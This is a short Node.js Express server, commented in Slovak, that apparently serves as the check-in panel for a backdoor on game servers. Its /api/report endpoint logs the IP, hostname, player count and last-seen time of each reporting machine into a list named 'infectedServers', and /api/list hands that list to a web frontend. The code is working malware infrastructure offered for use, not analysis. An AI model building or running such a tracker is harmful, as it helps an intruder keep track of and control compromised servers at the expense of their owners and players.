const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());

// Statické súbory - predpokladáme, že index.html je v priečinku 'frontend'
app.use(express.static(path.join(__dirname, '../frontend')));

let infectedServers = []; 

app.post('/api/report', (req, res) => {
    const newServer = {
        ip: req.ip.replace('::ffff:', ''),
        hostname: req.body.hostname || "Neznámy Server",
        players: req.body.players || 0,
        lastSeen: new Date().toLocaleTimeString()
    };
    const index = infectedServers.findIndex(s => s.ip === newServer.ip);
    if (index > -1) { infectedServers[index] = newServer; } 
    else { infectedServers.push(newServer); }
    res.status(200).send({ status: "ok" });
});

app.get('/api/list', (req, res) => {
    res.json(infectedServers);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

const PORT = process.env.PORT || 10000; 
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server beží na porte ${PORT}`);
});